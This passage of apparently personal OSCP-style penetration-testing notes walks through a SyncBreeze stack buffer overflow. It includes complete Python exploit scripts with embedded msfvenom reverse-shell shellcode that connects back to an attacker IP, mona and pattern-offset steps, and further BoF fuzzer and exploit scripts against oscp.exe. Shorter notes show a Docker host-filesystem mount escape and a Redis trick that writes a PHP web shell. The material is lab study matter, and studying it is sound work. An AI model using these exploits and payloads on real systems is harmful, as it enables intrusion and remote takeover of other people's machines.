s.send(buffer)<br />  <br />  s.close()<br />  <br />  <span style="color:#49aee6;font-weight:400">print</span> (<span style="color:#5ebdab;font-weight:400">&quot;\nDone!&quot;</span>)<br />  <br /><span style="color:#bf2e5e;font-weight:400">except</span>:<br />  <span style="color:#49aee6;font-weight:400">print</span> (<span style="color:#5ebdab;font-weight:400">&quot;\nCould not connect!&quot;</span>)</pre></div><br /><br />Using @ in the debugger, we will place a breakpoint at address 0x10090c83 in order to follow the execution of the JMP ESP instruction, and then we run our exploit again. The result is shown in Figure 15:<br /><br /><img src="images/131-3.png" alt="images/131-3.png" /><br /><br /><br />Our debugger shows that we did in fact reach our JMP ESP and hit the breakpoint we previously set. Pressing &amp; in the debugger will single-step into our shellcode placeholder, which is currently just a bunch of D&#39;s.<br /><br />Great! Now we just need to generate working shellcode and our exploit will be complete.</div><div class='page'><h1 class='title level-2'>Generating Shellcode with Metasploit</h1><br/><span style="color:#060f94;">kali@kali:~$ msfvenom -l payloads</span><br /><br />Framework Payloads (546 total) [--payload &lt;value&gt;]<br />==================================================<br /><br />    Name                            Description<br />    ----                            -----------<br />    aix/ppc/shell_bind_tcp          Listen for a connection and spawn a command shell<br />    aix/ppc/shell_find_port         Spawn a shell on an established connection<br />    aix/ppc/shell_interact          Simply execve /bin/sh (for inetd programs)<br />    aix/ppc/shell_reverse_tcp       Connect back to attacker and spawn a command shell<br />...<br />    windows/shell_reverse_tcp       Connect back to attacker and spawn a command shell<br />...<br /><br /><br />That seemed simple enough, but if we look carefully we can identify bad characters (such as null bytes) in the generated shellcode.<br /><br />When we cannot use generic shellcode, we must encode it to suit our target exploitation environment. This could mean transforming our shellcode into a pure alphanumeric payload, getting rid of bad characters, etc.<br /><br />We will use an advanced polymorphic encoder, shikata_ga_nai,4 to encode our shellcode and will also inform the encoder of known bad characters with the <strong><span style="color:#060f94;">-b </span></strong>option:<br /><br /><br /><strong><span style="color:#060f94;">kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f c –e x86/shikata_ga_nai -b &quot;\x00\x0a\x0d\x25\x26\x2b\x3d&quot;</span></strong><br />No platform was selected, choosing Msf::Module::Platform::Windows from the payload<br />No Arch selected, selecting Arch: x86 from the payload<br />Found 22 compatible encoders<br />Attempting to encode payload with 1 iterations of x86/shikata_ga_nai<br />x86/shikata_ga_nai succeeded with size 351 (iteration=0)<br />unsigned char buf[] =<br />&quot;\xbe\x55\xe5\xb6\x02\xda\xc9\xd9\x74\x24\xf4\x5a\x29\xc9\xb1&quot;<br />&quot;\x52\x31\x72\x12\x03\x72\x12\x83\x97\xe1\x54\xf7\xeb\x02\x1a&quot;<br />&quot;\xf8\x13\xd3\x7b\x70\xf6\xe2\xbb\xe6\x73\x54\x0c\x6c\xd1\x59&quot;<br />&quot;\xe7\x20\xc1\xea\x85\xec\xe6\x5b\x23\xcb\xc9\x5c\x18\x2f\x48&quot;<br />&quot;\xdf\x63\x7c\xaa\xde\xab\x71\xab\x27\xd1\x78\xf9\xf0\x9d\x2f&quot;<br />&quot;\xed\x75\xeb\xf3\x86\xc6\xfd\x73\x7b\x9e\xfc\x52\x2a\x94\xa6&quot;<br />&quot;\x74\xcd\x79\xd3\x3c\xd5\x9e\xde\xf7\x6e\x54\x94\x09\xa6\xa4&quot;<br />&quot;\x55\xa5\x87\x08\xa4\xb7\xc0\xaf\x57\xc2\x38\xcc\xea\xd5\xff&quot;<br />&quot;\xae\x30\x53\x1b\x08\xb2\xc3\xc7\xa8\x17\x95\x8c\xa7\xdc\xd1&quot;<br />&quot;\xca\xab\xe3\x36\x61\xd7\x68\xb9\xa5\x51\x2a\x9e\x61\x39\xe8&quot;<br />&quot;\xbf\x30\xe7\x5f\xbf\x22\x48\x3f\x65\x29\x65\x54\x14\x70\xe2&quot;<br />&quot;\x99\x15\x8a\xf2\xb5\x2e\xf9\xc0\x1a\x85\x95\x68\xd2\x03\x62&quot;<br />&quot;\x8e\xc9\xf4\xfc\x71\xf2\x04\xd5\xb5\xa6\x54\x4d\x1f\xc7\x3e&quot;<br />&quot;\x8d\xa0\x12\x90\xdd\x0e\xcd\x51\x8d\xee\xbd\x39\xc7\xe0\xe2&quot;<br />&quot;\x5a\xe8\x2a\x8b\xf1\x13\xbd\xbe\x0e\x1b\x2f\xd7\x12\x1b\x4e&quot;<br />&quot;\x9c\x9a\xfd\x3a\xf2\xca\x56\xd3\x6b\x57\x2c\x42\x73\x4d\x49&quot;<br />&quot;\x44\xff\x62\xae\x0b\x08\x0e\xbc\xfc\xf8\x45\x9e\xab\x07\x70&quot;<br />&quot;\xb6\x30\x95\x1f\x46\x3e\x86\xb7\x11\x17\x78\xce\xf7\x85\x23&quot;<br />&quot;\x78\xe5\x57\xb5\x43\xad\x83\x06\x4d\x2c\x41\x32\x69\x3e\x9f&quot;<br />&quot;\xbb\x35\x6a\x4f\xea\xe3\xc4\x29\x44\x42\xbe\xe3\x3b\x0c\x56&quot;<br />&quot;\x75\x70\x8f\x20\x7a\x5d\x79\xcc\xcb\x08\x3c\xf3\xe4\xdc\xc8&quot;<br />&quot;\x8c\x18\x7d\x36\x47\x99\x8d\x7d\xc5\x88\x05\xd8\x9c\x88\x4b&quot;<br />&quot;\xdb\x4b\xce\x75\x58\x79\xaf\x81\x40\x08\xaa\xce\xc6\xe1\xc6&quot;<br />&quot;\x5f\xa3\x05\x74\x5f\xe6&quot;;<br /><br /><br />The resulting shellcode contains no bad characters, is 351 bytes long, and will send a reverse shell to our IP address (10.11.0.4 in this example) on port 443.</div><div class='page'><h1 class='title level-2'>Getting a Shell</h1><br/>Getting a Shell<br />Getting a reverse shell from SyncBreeze should now be as simple as replacing our buffer of D&#39;s with the shellcode and launching our exploit.<br /><br />However, in this particular case, we have another hurdle to overcome. In the previous step, we generated an encoded shellcode using <strong><span style="color:#060f94;">msfvenom</span></strong>. Because of the <strong><span style="color:#060f94;">encoding</span></strong>, the shellcode is not directly executable and is therefore prepended by a <strong><span style="color:#060f94;">decoder stub</span></strong>. The job of this stub is to iterate over the encoded shellcode bytes and decode them back to their original executable form. In order to perform this task, the decoder needs to gather its address in memory and from there, look a few bytes ahead to locate the encoded shellcode that it needs to decode. As part of the process of gathering the decoder stub&#39;s location in memory, the code performs a sequence of assembly instructions, which are commonly referred to as a <strong><span style="color:#060f94;">GetPC routine</span></strong>. This is essentially a short routine that moves the value of the <strong><span style="color:#060f94;">EIP register</span></strong> (sometimes referred to as the Program Counter or PC) into another register.<br /><br />As with other <strong><span style="color:#060f94;">GetPC routines</span></strong>, those used by <strong><span style="color:#060f94;">shikata_ga_nai</span></strong> have an <strong><span style="color:#060f94;">unfortunate side-effect of writing some data at and around the top of the stack</span></strong>. This eventually mangles at least a couple of bytes close to the address pointed at by the ESP register. Unfortunately, this small change on the stack is a problem for us because the decoder starts exactly at the address pointed to by the ESP register. <strong><span style="color:#060f94;">In short, the GetPC routine execution ends up changing a few bytes of the decoder itself (and potentially the encoded shellcode), which eventually fails the decoding process and crashes the target process.</span></strong><br /><br /><img src="images/133-1.png" alt="images/133-1.png" /><br /><br />One method to avoid this issue is to adjust ESP backwards, making use of assembly instructions such as DEC ESP, SUB ESP, 0xXX, before executing the decoder. Alternatively, we could create a wide &quot;landing pad&quot; for our JMP ESP, such that when execution lands anywhere on this pad, it will continue on to our payload. This may sound complicated, but we simply precede our payload with a series of No Operation (or NOP) instructions, which have an opcode value of 0x90. As the name suggests, these instructions do nothing, and simply pass execution to the next instruction. Used in this way, these instructions, also defined as a<strong><span style="color:#060f94;"> NOP sled</span></strong> or NOP slide, will let the CPU &quot;slide&quot; through the NOPs until the payload is reached.<br /><br />In both cases, by the time the execution reaches the shellcode decoder, the stack pointer points far enough away from it so as to <strong><span style="color:#060f94;">not corrupt the shellcode when the GetPC routine overwrites a few bytes on the stack.</span></strong><br /><br />With an added NOP sled, our final exploit looks similar to Listing 22 below:<br /><br /><strong><h2>Final Code</h2></strong><br /><br /><div class="codebox"><pre><span style="color:#4a88f1;font-weight:700">#!/usr/bin/python</span><br /><span style="color:#bf2e5e;font-weight:400">import</span> socket<br /><br /><span style="color:#bf2e5e;font-weight:400">try</span>:<br />  <span style="color:#49aee6;font-weight:400">print</span> <span style="color:#5ebdab;font-weight:400">&quot;\nSending evil buffer...&quot;</span><br /><br />  shellcode = (<span style="color:#5ebdab;font-weight:400">&quot;\xbe\x55\xe5\xb6\x02\xda\xc9\xd9\x74\x24\xf4\x5a\x29\xc9\xb1&quot;</span><br />  <span style="color:#5ebdab;font-weight:400">&quot;\x52\x31\x72\x12\x03\x72\x12\x83\x97\xe1\x54\xf7\xeb\x02\x1a&quot;</span><br />  <span style="color:#5ebdab;font-weight:400">&quot;\xf8\x13\xd3\x7b\x70\xf6\xe2\xbb\xe6\x73\x54\x0c\x6c\xd1\x59&quot;</span><br />  <span style="color:#5ebdab;font-weight:400">&quot;\xe7\x20\xc1\xea\x85\xec\xe6\x5b\x23\xcb\xc9\x5c\x18\x2f\x48&quot;</span><br />  <span style="color:#5ebdab;font-weight:400">&quot;\xdf\x63\x7c\xaa\xde\xab\x71\xab\x27\xd1\x78\xf9\xf0\x9d\x2f&quot;</span><br />  <span style="color:#5ebdab;font-weight:400">&quot;\xed\x75\xeb\xf3\x86\xc6\xfd\x73\x7b\x9e\xfc\x52\x2a\x94\xa6&quot;</span><br />  <span style="color:#5ebdab;font-weight:400">&quot;\x74\xcd\x79\xd3\x3c\xd5\x9e\xde\xf7\x6e\x54\x94\x09\xa6\xa4&quot;</span><br />  <span style="color:#5ebdab;font-weight:400">&quot;\x55\xa5\x87\x08\xa4\xb7\xc0\xaf\x57\xc2\x38\xcc\xea\xd5\xff&quot;</span><br />  <span style="color:#5ebdab;font-weight:400">&quot;\xae\x30\x53\x1b\x08\xb2\xc3\xc7\xa8\x17\x95\x8c\xa7\xdc\xd1&quot;</span><br />  <span style="color:#5ebdab;font-weight:400">&quot;\xca\xab\xe3\x36\x61\xd7\x68\xb9\xa5\x51\x2a\x9e\x61\x39\xe8&quot;</span><br />  <span style="color:#5ebdab;font-weight:400">&quot;\xbf\x30\xe7\x5f\xbf\x22\x48\x3f\x65\x29\x65\x54\x14\x70\xe2&quot;</span><br />  <span style="color:#5ebdab;font-weight:400">&quot;\x99\x15\x8a\xf2\xb5\x2e\xf9\xc0\x1a\x85\x95\x68\xd2\x03\x62&quot;</span><br />  <span style="color:#5ebdab;font-weight:400">&quot;\x8e\xc9\xf4\xfc\x71\xf2\x04\xd5\xb5\xa6\x54\x4d\x1f\xc7\x3e&quot;</span><br />  <span style="color:#5ebdab;font-weight:400">&quot;\x8d\xa0\x12\x90\xdd\x0e\xcd\x51\x8d\xee\xbd\x39\xc7\xe0\xe2&quot;</span><br />  <span style="color:#5ebdab;font-weight:400">&quot;\x5a\xe8\x2a\x8b\xf1\x13\xbd\xbe\x0e\x1b\x2f\xd7\x12\x1b\x4e&quot;</span><br />  <span style="color:#5ebdab;font-weight:400">&quot;\x9c\x9a\xfd\x3a\xf2\xca\x56\xd3\x6b\x57\x2c\x42\x73\x4d\x49&quot;</span><br />  <span style="color:#5ebdab;font-weight:400">&quot;\x44\xff\x62\xae\x0b\x08\x0e\xbc\xfc\xf8\x45\x9e\xab\x07\x70&quot;</span><br />  <span style="color:#5ebdab;font-weight:400">&quot;\xb6\x30\x95\x1f\x46\x3e\x86\xb7\x11\x17\x78\xce\xf7\x85\x23&quot;</span><br />  <span style="color:#5ebdab;font-weight:400">&quot;\x78\xe5\x57\xb5\x43\xad\x83\x06\x4d\x2c\x41\x32\x69\x3e\x9f&quot;</span><br />  <span style="color:#5ebdab;font-weight:400">&quot;\xbb\x35\x6a\x4f\xea\xe3\xc4\x29\x44\x42\xbe\xe3\x3b\x0c\x56&quot;</span><br />  <span style="color:#5ebdab;font-weight:400">&quot;\x75\x70\x8f\x20\x7a\x5d\x79\xcc\xcb\x08\x3c\xf3\xe4\xdc\xc8&quot;</span><br />  <span style="color:#5ebdab;font-weight:400">&quot;\x8c\x18\x7d\x36\x47\x99\x8d\x7d\xc5\x88\x05\xd8\x9c\x88\x4b&quot;</span><br />  <span style="color:#5ebdab;font-weight:400">&quot;\xdb\x4b\xce\x75\x58\x79\xaf\x81\x40\x08\xaa\xce\xc6\xe1\xc6&quot;</span><br />  <span style="color:#5ebdab;font-weight:400">&quot;\x5f\xa3\x05\x74\x5f\xe6&quot;</span>)<br /><br />  filler = <span style="color:#5ebdab;font-weight:400">&quot;A&quot;</span> * <span style="color:#9755b3;font-weight:400">780</span><br />  eip = <span style="color:#5ebdab;font-weight:400">&quot;\x83\x0c\x09\x10&quot;</span><br />  offset = <span style="color:#5ebdab;font-weight:400">&quot;C&quot;</span> * <span style="color:#9755b3;font-weight:400">4</span><br />  nops = <span style="color:#5ebdab;font-weight:400">&quot;\x90&quot;</span> * <span style="color:#9755b3;font-weight:400">10</span><br /><br />  inputBuffer = filler + eip + offset + nops + shellcode<br />  <br />  content = <span style="color:#5ebdab;font-weight:400">&quot;username=&quot;</span> + inputBuffer + <span style="color:#5ebdab;font-weight:400">&quot;&amp;password=A&quot;</span><br /><br />  buffer = <span style="color:#5ebdab;font-weight:400">&quot;POST /login HTTP/1.1\r\n&quot;</span><br />  buffer += <span style="color:#5ebdab;font-weight:400">&quot;Host: 10.11.0.22\r\n&quot;</span><br />  buffer += <span style="color:#5ebdab;font-weight:400">&quot;User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n&quot;</span><br />  buffer += <span style="color:#5ebdab;font-weight:400">&quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n&quot;</span><br />  buffer += <span style="color:#5ebdab;font-weight:400">&quot;Accept-Language: en-US,en;q=0.5\r\n&quot;</span><br />  buffer += <span style="color:#5ebdab;font-weight:400">&quot;Referer: http://10.11.0.22/login\r\n&quot;</span><br />  buffer += <span style="color:#5ebdab;font-weight:400">&quot;Connection: close\r\n&quot;</span><br />  buffer += <span style="color:#5ebdab;font-weight:400">&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;</span><br />  buffer += <span style="color:#5ebdab;font-weight:400">&quot;Content-Length: &quot;</span>+<span style="color:#49aee6;font-weight:400">str</span>(<span style="color:#49aee6;font-weight:400">len</span>(content))+<span style="color:#5ebdab;font-weight:400">&quot;\r\n&quot;</span><br />  buffer += <span style="color:#5ebdab;font-weight:400">&quot;\r\n&quot;</span><br />  <br />  buffer += content<br /><br />  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)<br />  <br />  s.connect((<span style="color:#5ebdab;font-weight:400">&quot;10.11.0.22&quot;</span>, <span style="color:#9755b3;font-weight:400">80</span>))<br />  s.send(buffer)<br />  <br />  s.close()<br />  <br />  <span style="color:#49aee6;font-weight:400">print</span> (<span style="color:#5ebdab;font-weight:400">&quot;\nDone did you get a reverse shell?&quot;</span>)<br />  <br /><span style="color:#bf2e5e;font-weight:400">except</span>:<br />  <span style="color:#49aee6;font-weight:400">print</span> (<span style="color:#5ebdab;font-weight:400">&quot;\nCould not connect!&quot;</span>)</pre></div></div><div class='page'><h1 class='title level-2'>Improving the Exploit</h1><br/><img src="images/134-1.png" alt="images/134-1.png" /><br /><br /><strong><span style="color:#060f94;">kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 </span></strong><strong><span style="color:#237522;">EXITFUNC=thread </span></strong><strong><span style="color:#060f94;">-f c –e x86/shikata_ga_nai -b &quot;\x00\x0a\x0d\x25\x26\x2b\x3d&quot;</span></strong></div><div class='page'><h1 class='title level-2'>BoF Notes(old)</h1><br/><code>!mona config -set workingfolder c:\mona\%p</code><br /><strong><h2>Fuzzing</h2></strong><br />fuzzer.py<br /><div class="codebox"><pre>import socket<br /><br />ip = <span style="color:#5ebdab;font-weight:400">&quot;10.10.6.54&quot;</span><br />port = 1337<br /><br />prefix = <span style="color:#5ebdab;font-weight:400">&quot;OVERFLOW1 &quot;</span><br />offset = 1978<br />overflow = <span style="color:#5ebdab;font-weight:400">&quot;A&quot;</span> * offset<br />retn = <span style="color:#5ebdab;font-weight:400">&quot;\xaf\x11\x50\x62&quot;</span><br />padding = <span style="color:#5ebdab;font-weight:400">&quot;\x90&quot;</span> * 16<br />payload = <span style="color:#bf2e5e;font-weight:400">(</span><span style="color:#5ebdab;font-weight:400">&quot;\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e&quot;</span><br /><span style="color:#5ebdab;font-weight:400">&quot;\x9c\xb8\x35\xaf\x83\xee\xfc\xe2\xf4\x60\x50\xb7\xaf\x9c\xb8&quot;</span><br /><span style="color:#5ebdab;font-weight:400">&quot;\x55\x26\x79\x89\xf5\xcb\x17\xe8\x05\x24\xce\xb4\xbe\xfd\x88&quot;</span><br /><span style="color:#5ebdab;font-weight:400">&quot;\x33\x47\x87\x93\x0f\x7f\x89\xad\x47\x99\x93\xfd\xc4\x37\x83&quot;</span><br /><span style="color:#5ebdab;font-weight:400">&quot;\xbc\x79\xfa\xa2\x9d\x7f\xd7\x5d\xce\xef\xbe\xfd\x8c\x33\x7f&quot;</span><br /><span style="color:#5ebdab;font-weight:400">&quot;\x93\x17\xf4\x24\xd7\x7f\xf0\x34\x7e\xcd\x33\x6c\x8f\x9d\x6b&quot;</span><br /><span style="color:#5ebdab;font-weight:400">&quot;\xbe\xe6\x84\x5b\x0f\xe6\x17\x8c\xbe\xae\x4a\x89\xca\x03\x5d&quot;</span><br /><span style="color:#5ebdab;font-weight:400">&quot;\x77\x38\xae\x5b\x80\xd5\xda\x6a\xbb\x48\x57\xa7\xc5\x11\xda&quot;</span><br /><span style="color:#5ebdab;font-weight:400">&quot;\x78\xe0\xbe\xf7\xb8\xb9\xe6\xc9\x17\xb4\x7e\x24\xc4\xa4\x34&quot;</span><br /><span style="color:#5ebdab;font-weight:400">&quot;\x7c\x17\xbc\xbe\xae\x4c\x31\x71\x8b\xb8\xe3\x6e\xce\xc5\xe2&quot;</span><br /><span style="color:#5ebdab;font-weight:400">&quot;\x64\x50\x7c\xe7\x6a\xf5\x17\xaa\xde\x22\xc1\xd0\x06\x9d\x9c&quot;</span><br /><span style="color:#5ebdab;font-weight:400">&quot;\xb8\x5d\xd8\xef\x8a\x6a\xfb\xf4\xf4\x42\x89\x9b\x47\xe0\x17&quot;</span><br /><span style="color:#5ebdab;font-weight:400">&quot;\x0c\xb9\x35\xaf\xb5\x7c\x61\xff\xf4\x91\xb5\xc4\x9c\x47\xe0&quot;</span><br /><span style="color:#5ebdab;font-weight:400">&quot;\xff\xcc\xe8\x65\xef\xcc\xf8\x65\xc7\x76\xb7\xea\x4f\x63\x6d&quot;</span><br /><span style="color:#5ebdab;font-weight:400">&quot;\xa2\xc5\x99\xd0\x3f\xa4\x8d\xd2\x5d\xad\x9c\xa2\x3f\x26\x7a&quot;</span><br /><span style="color:#5ebdab;font-weight:400">&quot;\xd2\x25\xf9\xcb\xd0\xac\x0a\xe8\xd9\xca\x7a\x19\x78\x41\xa3&quot;</span><br /><span style="color:#5ebdab;font-weight:400">&quot;\x63\xf6\x3d\xda\x70\xd0\xc5\x1a\x3e\xee\xca\x7a\xf4\xdb\x58&quot;</span><br /><span style="color:#5ebdab;font-weight:400">&quot;\xcb\x9c\x31\xd6\xf8\xcb\xef\x04\x59\xf6\xaa\x6c\xf9\x7e\x45&quot;</span><br /><span style="color:#5ebdab;font-weight:400">&quot;\x53\x68\xd8\x9c\x09\xae\x9d\x35\x71\x8b\x8c\x7e\x35\xeb\xc8&quot;</span><br /><span style="color:#5ebdab;font-weight:400">&quot;\xe8\x63\xf9\xca\xfe\x63\xe1\xca\xee\x66\xf9\xf4\xc1\xf9\x90&quot;</span><br /><span style="color:#5ebdab;font-weight:400">&quot;\x1a\x47\xe0\x26\x7c\xf6\x63\xe9\x63\x88\x5d\xa7\x1b\xa5\x55&quot;</span><br /><span style="color:#5ebdab;font-weight:400">&quot;\x50\x49\x03\xd5\xb2\xb6\xb2\x5d\x09\x09\x05\xa8\x50\x49\x84&quot;</span><br /><span style="color:#5ebdab;font-weight:400">&quot;\x33\xd3\x96\x38\xce\x4f\xe9\xbd\x8e\xe8\x8f\xca\x5a\xc5\x9c&quot;</span><br /><span style="color:#5ebdab;font-weight:400">&quot;\xeb\xca\x7a&quot;</span><span style="color:#bf2e5e;font-weight:400">)</span><br /><br />postfix = <span style="color:#5ebdab;font-weight:400">&quot;&quot;</span><br /><br />buffer = prefix + overflow + retn + padding + payload + postfix<br /><br />s = socket.socket<span style="color:#bf2e5e;font-weight:400">(</span>socket.AF_INET, socket.SOCK_STREAM<span style="color:#bf2e5e;font-weight:400">)</span><br /><br />try<span style="color:#bf2e5e;font-weight:400">:</span><br />  s.connect<span style="color:#bf2e5e;font-weight:400">((</span>ip, port<span style="color:#bf2e5e;font-weight:400">))</span><br />  print<span style="color:#bf2e5e;font-weight:400">(</span><span style="color:#5ebdab;font-weight:400">&quot;Sending evil buffer...&quot;</span><span style="color:#bf2e5e;font-weight:400">)</span><br />  s.send<span style="color:#bf2e5e;font-weight:400">(</span>bytes<span style="color:#bf2e5e;font-weight:400">(</span>buffer + <span style="color:#5ebdab;font-weight:400">&quot;\r\n&quot;</span>, <span style="color:#5ebdab;font-weight:400">&quot;latin-1&quot;</span><span style="color:#bf2e5e;font-weight:400">))</span><br />  print<span style="color:#bf2e5e;font-weight:400">(</span><span style="color:#5ebdab;font-weight:400">&quot;Done!&quot;</span><span style="color:#bf2e5e;font-weight:400">)</span><br />except<span style="color:#bf2e5e;font-weight:400">:</span><br />  print<span style="color:#bf2e5e;font-weight:400">(</span><span style="color:#5ebdab;font-weight:400">&quot;Could not connect.&quot;</span><span style="color:#bf2e5e;font-weight:400">)</span></pre></div><br /><br /><br /><strong><h2>Crash Replication &amp; Controlling EIP</h2></strong><br />exploit.py<br /><div class="codebox"><pre><span style="color:#4a88f1;font-weight:700">#!/usr/bin/env python3</span><br /><br />import socket, time, sys<br /><br />ip = <span style="color:#5ebdab;font-weight:400">&quot;10.10.6.54&quot;</span><br /><br />port = 1337<br />timeout = 5<br />prefix = <span style="color:#5ebdab;font-weight:400">&quot;OVERFLOW1 &quot;</span><br /><br />string = prefix + <span style="color:#5ebdab;font-weight:400">&quot;A&quot;</span> * 100<br /><br /><span style="color:#bf2e5e;font-weight:400">while</span> True<span style="color:#bf2e5e;font-weight:400">:</span><br />  try<span style="color:#bf2e5e;font-weight:400">:</span><br />    with socket.socket<span style="color:#bf2e5e;font-weight:400">(</span>socket.AF_INET, socket.SOCK_STREAM<span style="color:#bf2e5e;font-weight:400">)</span> as s<span style="color:#bf2e5e;font-weight:400">:</span><br />      s.settimeout<span style="color:#bf2e5e;font-weight:400">(</span>timeout<span style="color:#bf2e5e;font-weight:400">)</span><br />      s.connect<span style="color:#bf2e5e;font-weight:400">((</span>ip, port<span style="color:#bf2e5e;font-weight:400">))</span><br />      s.recv<span style="color:#bf2e5e;font-weight:400">(</span>1024<span style="color:#bf2e5e;font-weight:400">)</span><br />      print<span style="color:#bf2e5e;font-weight:400">(</span><span style="color:#5ebdab;font-weight:400">&quot;Fuzzing with {} bytes&quot;</span>.format<span style="color:#bf2e5e;font-weight:400">(</span>len<span style="color:#bf2e5e;font-weight:400">(</span>string<span style="color:#bf2e5e;font-weight:400">)</span> - len<span style="color:#bf2e5e;font-weight:400">(</span>prefix<span style="color:#bf2e5e;font-weight:400">)))</span><br />      s.send<span style="color:#bf2e5e;font-weight:400">(</span>bytes<span style="color:#bf2e5e;font-weight:400">(</span>string, <span style="color:#5ebdab;font-weight:400">&quot;latin-1&quot;</span><span style="color:#bf2e5e;font-weight:400">))</span><br />      s.recv<span style="color:#bf2e5e;font-weight:400">(</span>1024<span style="color:#bf2e5e;font-weight:400">)</span><br />  except<span style="color:#bf2e5e;font-weight:400">:</span><br />    print<span style="color:#bf2e5e;font-weight:400">(</span><span style="color:#5ebdab;font-weight:400">&quot;Fuzzing crashed at {} bytes&quot;</span>.format<span style="color:#bf2e5e;font-weight:400">(</span>len<span style="color:#bf2e5e;font-weight:400">(</span>string<span style="color:#bf2e5e;font-weight:400">)</span> - len<span style="color:#bf2e5e;font-weight:400">(</span>prefix<span style="color:#bf2e5e;font-weight:400">)))</span><br />    sys.exit<span style="color:#bf2e5e;font-weight:400">(</span>0<span style="color:#bf2e5e;font-weight:400">)</span><br />  string += 100 * <span style="color:#5ebdab;font-weight:400">&quot;A&quot;</span><br />  time.sleep<span style="color:#bf2e5e;font-weight:400">(</span>1<span style="color:#bf2e5e;font-weight:400">)</span></pre></div><br /><br /><br />Run the following command to generate a cyclic pattern of a length  400 bytes longer that the string that crashed the server (change the -l  value to this):<br /><code>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600</code><br /><br />The script should crash the oscp.exe server again. This time, in  Immunity Debugger, in the command input box at the bottom of the screen,  run the following mona command, changing the distance to the same  length as the pattern you created:<br /><br /><strong>!mona findmsp -distance 2400</strong><br /><br /><code>EIP contains normal pattern : ... (offset XXXX)</code><br />Update  your exploit.py script and set the offset variable to this value (was  previously set to 0). Set the payload variable to an empty string again.  Set the retn variable to &quot;BBBB&quot;.<br />Restart oscp.exe in Immunity and  run the modified exploit.py script again. The EIP register should now  be overwritten with the 4 B&#39;s (e.g. 42424242).<br /><br /><strong><h2>Finding Bad Characters</h2></strong><br />Generate a bytearray using mona, and exclude the null byte (\x00) by  default. Note the location of the bytearray.bin file that is generated  (if the working folder was set per the Mona Configuration section of  this guide, then the location should be C:\mona\oscp\bytearray.bin).<br /><code>!mona bytearray -b &quot;\x00&quot;<br /></code><br />Now generate a string of bad chars that is identical to the  bytearray. The following python script can be used to generate a string  of bad chars from \x01 to \xff:<br /><br />generate_bad_chars.py<br /><div class="codebox"><pre><span style="color:#bf2e5e;font-weight:400">for</span> <span style="color:#9755b3;font-weight:400">x</span> <span style="color:#bf2e5e;font-weight:400">in</span> range<span style="color:#bf2e5e;font-weight:400">(</span>1, 256<span style="color:#bf2e5e;font-weight:400">):</span><br />	<span style="color:#bf2e5e;font-weight:400">if</span> <span style="color:#bf2e5e;font-weight:400">(</span>x ==1 or x == 7 or x==8 or x==46 or x==47 or x==160 or x==161<span style="color:#bf2e5e;font-weight:400">):</span><br />		<span style="color:#bf2e5e;font-weight:400">continue</span><br />	print<span style="color:#bf2e5e;font-weight:400">(</span><span style="color:#5ebdab;font-weight:400">&quot;\\x&quot;</span> + <span style="color:#5ebdab;font-weight:400">&quot;{:02x}&quot;</span>.format<span style="color:#bf2e5e;font-weight:400">(</span>x<span style="color:#bf2e5e;font-weight:400">)</span>, end=<span style="color:#5ebdab;font-weight:400">&#39;&#39;</span><span style="color:#bf2e5e;font-weight:400">)</span><br /><span style="color:#4a88f1;font-weight:400">print()</span></pre></div><br /><br />Update your exploit.py script and set the payload variable to the string of bad chars the script generates.<br />Restart  oscp.exe in Immunity and run the modified exploit.py script again. Make  a note of the address to which the ESP register points and use it in  the following mona command:<br /><code>!mona compare -f C:\mona\oscp\bytearray.bin -a &lt;address&gt;</code><br /><br />02ABEEA8<br /><strong><h2>Finding a Jump Point<br /></h2></strong><br />With  the oscp.exe either running or in a crashed state, run the following  mona command, making sure to update the -cpb option with all the  badchars you identified (including \x00):<br /><br /><code>!mona jmp -r esp -cpb &quot;\x00&quot;</code><br /><br /><br />!mona jmp -r esp -m gatekeeper.exe<br /><br /><strong><h2>Generate Payloa</h2></strong>d<br /><br /><code>msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b &quot;\x00&quot; -f c</code><br /><br />msfvenom -p windows/shell_reverse_tcp LHOST=10.11.17.106 LPORT=6666 EXITFUNC=thread -b &quot;\x00\x01\x07\x08\x2e\x2f\xa0\xa1&quot; -f c<br /><br /><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.11.17.106 LPORT=6666 EXITFUNC=thread -b &quot;\x00&quot; -f c</code><br /><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.11.17.106 LPORT=6666 EXITFUNC=thread -b &quot;\x00\x01&quot; -f c</code><br /><br /><br /><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.11.17.106 LPORT=6666 EXITFUNC=thread -b &quot;\x00\x0a&quot; -f c</code><br /><br /><br /><strong>Mona other commands</strong><br /><code>!mona find -s &quot;\xff\xe4&quot; -m essfunc.dll</code><br /><br /><br /><code>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.181.137 LPORT=4444 EXITFUNC=thread -b &quot;\x00&quot; -f c</code></div><div class='page'><h1 class='title level-1'>Misc. Notes</h1><br/></div><div class='page'><h1 class='title level-2'>Docker</h1><br/><strong><span style="color:#ffff00;">Docker Load Image</span></strong><br /><br />docker load &lt; image.tar<br /><br /><strong><span style="color:#ffff00;">Docker Explore Image Content</span></strong><br />docker run -it flask-dashboard-adminlte_appseed-app  sh<br /><br /><strong><span style="color:#ffff00;">Docker Run Image</span></strong><br /><br />docker run -p 127.0.0.1:80:8080 $image_id<br /><br />docker run -p 127.0.0.1:5005:5005 859e74798e6c</div><div class='page'><h1 class='title level-3'>docker</h1><br/><code>docker run -v /:/mnt --rm -it alpine sh</code> <br /><br /><code>/ # ls -la /mnt/root/</code></div><div class='page'><h1 class='title level-2'>redis</h1><br/>redis_cli -h 10.x.x.x<br /><br />info<br /><br />CONFIG SET dir /var/www/html<br />CONFIG SET dbfilename dosh.php<br />SET PAYLOAD &quot;&lt;?php system(\$_GET[&#39;cmd&#39;]); ?&gt;&quot;</div><div class='page'><h1 class='title level-2'>SCAN</h1><br/>rustscan -a 10.10.10.56 